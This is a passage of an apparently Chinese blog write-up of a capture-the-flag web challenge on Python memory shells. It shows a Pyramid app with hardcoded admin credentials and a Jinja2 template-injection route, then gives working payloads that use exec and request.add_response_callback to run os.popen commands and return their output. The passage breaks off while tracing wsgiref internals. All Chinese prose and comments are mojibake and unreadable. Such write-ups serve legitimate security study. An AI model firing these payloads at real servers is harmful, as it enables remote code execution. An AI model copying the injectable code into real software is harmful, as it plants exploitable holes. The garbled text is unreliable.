</span></span><span class="line"><span class="cl"><span class="n">users</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;admin&#34;</span><span class="p">:</span> <span class="n">User</span><span class="p">(</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;123456&#34;</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">root_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ÈáçÂÆöÂêëÂà∞ /login</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">HTTPFound</span><span class="p">(</span><span class="n">location</span><span class="o">=</span><span class="s1">&#39;/login&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">info_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Êü•ÁúãÁªÜËäÇÂÜÖÂÆπ</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;ËØ∑ÂÖàÁôªÂΩï&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">file_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">params</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_base</span><span class="p">,</span> <span class="n">file_extension</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">file_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">file_name</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;/app/static/details/&#39;</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">FileNotFoundError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;Êñá‰ª∂Êú™ÊâæÂà∞„ÄÇ&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">content</span> <span class="o">=</span> <span class="s2">&#34;Êú™Êèê‰æõÊñá‰ª∂Âêç„ÄÇ&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;file_name&#39;</span><span class="p">:</span> <span class="n">file_name</span><span class="p">,</span> <span class="s1">&#39;content&#39;</span><span class="p">:</span> <span class="n">content</span><span class="p">,</span> <span class="s1">&#39;file_base&#39;</span><span class="p">:</span> <span class="n">file_base</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># ‰∏ªË∑ØÁî±</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;ËØ∑ÂÖàÁôªÂΩï&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">detailtxt</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;/app/static/details/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">picture_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="p">[:</span><span class="n">i</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">detailtxt</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">file_contents</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">picture</span> <span class="ow">in</span> <span class="n">picture_list</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/app/static/details/</span><span class="si">{</span><span class="n">picture</span><span class="si">}</span><span class="s2">.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">file_contents</span><span class="p">[</span><span class="n">picture</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;picture_list&#39;</span><span class="p">:</span> <span class="n">picture_list</span><span class="p">,</span> <span class="s1">&#39;file_contents&#39;</span><span class="p">:</span> <span class="n">file_contents</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_captcha</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;captcha&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_captcha</span> <span class="o">!=</span> <span class="n">captcha_store</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;captcha_text&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;È™åËØÅÁ†ÅÈîôËØØÔºåËØ∑ÈáçËØï„ÄÇ&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">user</span><span class="o">.</span><span class="n">password</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;ÁôªÂΩïÊàêÂäüÔºÅ&amp;lt;a href=&#39;/home&#39;&amp;gt;ÁÇπÂáªËøõÂÖ•‰∏ªÈ°µ&amp;lt;/a&amp;gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;Áî®Êà∑ÂêçÊàñÂØÜÁ†ÅÈîôËØØ„ÄÇ&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shell_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;ËØ∑ÂÖàÁôªÂΩï&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">expression</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;shellcmd&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">blacklist_patterns</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s1">&#39;.*length.*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*count.*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*[0-9].*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*\..*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*soft.*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*%.*&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">expression</span><span class="p">)</span> <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">blacklist_patterns</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;wafwafwaf&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">jinja2</span><span class="o">.</span><span class="n">BaseLoader</span><span class="p">())</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">({</span><span class="s2">&#34;request&#34;</span><span class="p">:</span> <span class="n">request</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">result</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session_factory</span> <span class="o">=</span> <span class="n">SignedCookieSessionFactory</span><span class="p">(</span><span class="s1">&#39;secret_key&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">Configurator</span><span class="p">(</span><span class="n">session_factory</span><span class="o">=</span><span class="n">session_factory</span><span class="p">)</span> <span class="k">as</span> <span class="n">config</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">include</span><span class="p">(</span><span class="s1">&#39;pyramid_chameleon&#39;</span><span class="p">)</span>  <span class="c1"># Ê∑ªÂä†Ê∏≤ÊüìÊ®°Êùø</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_static_view</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s1">&#39;/app/static&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">set_default_permission</span><span class="p">(</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>  <span class="c1"># ËÆæÁΩÆÈªòËÆ§ÊùÉÈôê‰∏∫view</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Ê≥®ÂÜåË∑ØÁî±</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;captcha&#39;</span><span class="p">,</span> <span class="s1">&#39;/captcha&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">,</span> <span class="s1">&#39;/home&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="s1">&#39;/info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="s1">&#39;/login&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span> <span class="s1">&#39;/shell&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Ê≥®ÂÜåËßÜÂõæ</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">root_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">captcha_image_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;captcha&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">home_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;home&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;home.pt&#39;</span><span class="p">,</span> <span class="n">permission</span><span class="o">=</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">info_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;details.pt&#39;</span><span class="p">,</span> <span class="n">permission</span><span class="o">=</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">login_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;login.pt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">shell_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="n">permission</span><span class="o">=</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">scan</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">app</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span> <span class="o">=</span> <span class="n">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">6543</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãÂà∞shellË∑ØÁî±Â≠òÂú®sstiÊºèÊ¥û‰ΩÜÊòØÊó†ÂõûÊòæ</p>
<p>Ê∑ªÂä†Ë∑ØÁî±ËßÜÂõæÁî®Âà∞<code> config.add_view</code>ÔºåÊàë‰ª¨ÂèØ‰ª•Êü•ÁúãconfigÁöÑÊâÄÊúâÂèòÈáè</p>
<p>ÊâæÂà∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;add_exception_view&#39;, &#39;add_forbidden_view&#39;, &#39;add_notfound_view&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØconfigÂú®mainÂáΩÊï∞ÈáåÈù¢Ôºå‰∏çÊòØÂÖ®Â±ÄÂèòÈáèÊ≤°Ê≥ïÁî®</p>
<h4 id="pyramidÈí©Â≠êÂáΩÊï∞">pyramidÈí©Â≠êÂáΩÊï∞
</h4><p>ÁúãÂÆòÊñπÊñáÊ°£use hook:<a class="link" href="https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html"  target="_blank" rel="noopener"
    >Using Hooks ‚Äî The Pyramid Web Application Development Framework v1.4.9</a></p>
<p>ÂèëÁé∞ request ‰πüÂ≠òÂú®Èí©Â≠êÂáΩÊï∞</p>
<p><img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420214843414.png"
	width="1587"
	height="637"
	srcset="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420214843414_hu13101023763740838303.png 480w, /p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420214843414_hu12370585808934897804.png 1024w"
	loading="lazy"
	
		alt="image-20250420214843414"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="597px"
	
></p>
<p>ÂèØ‰ª•Âà©Áî®<code>request.add_response_callback</code>Êù•ÊûÑÈÄ†ÂõûÊòæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">request</span><span class="o">.</span><span class="n">add_response_callback</span><span class="p">(</span><span class="k">lambda</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span><span class="p">:</span> <span class="nb">setattr</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÜçÂ•óËøõ exec ÊñπÊ≥ï‰∏≠</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="s2">&#34;request.add_response_callback(lambda request, response: setattr(response,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span><span class="s2">&#34;,{&#39;request&#39;: request})}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="s2">&#34;request.add_response_callback(lambda request, response: setattr(response,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span><span class="s2">&#34;,{&#39;request&#39;: request})}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≥®ÊÑèÊúÄÂêéÁöÑ <code>{'request': request} </code>ÔºåÂ£∞Êòé requestÔºåÂõ†‰∏∫Âú® exec ÁöÑ‰ΩúÁî®Âüü‰∏≠Ê≤°Êúâ requestÔºåÈúÄË¶ÅËøõË°å
Â£∞ÊòéÔºåÊúÄÂêéÂæóÂà∞ÂõûÊòæËøõË°åÂëΩ‰ª§ÊâßË°å</p>
<p><img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420215607082.png"
	width="1597"
	height="737"
	srcset="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420215607082_hu977348074053820220.png 480w, /p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420215607082_hu4945575061112993738.png 1024w"
	loading="lazy"
	
		alt="image-20250420215607082"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="520px"
	
></p>
<p>ÊàñËÄÖÁî®Ëøô‰∏™<code>request.add_finished_callback</code>‰πüËÉΩÊâìÂõûÊòæ</p>
<h4 id="Âà©Áî®headerÂ§¥Â§ñÂ∏¶ÂõûÊòæ">Âà©Áî®headerÂ§¥Â§ñÂ∏¶ÂõûÊòæ
</h4><p>ËøôÈáåÂèÇËÄÉÔºö<a class="link" href="https://xz.aliyun.com/news/16143"  target="_blank" rel="noopener"
    >wsgirefÂ∫îÁî®Êó†ÂõûÊòæËØ¶ÁªÜË∞ÉËØïÁ†îÁ©∂-ÂÖàÁü•Á§æÂå∫</a></p>
<p>ÂÖàË∞ÉËØïÊâæËØ∑Ê±ÇËøáÁ®ã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Call finish_request.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Overridden by ForkingMixIn and ThreadingMixIn.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">finish_request</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">shutdown_request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõ<code>finish_request</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">finish_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Finish one request by instantiating RequestHandlerClass.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">RequestHandlerClass</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõ<code>RequestHandlerClass</code>Á±ªÁöÑhandlerÊñπÊ≥ï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
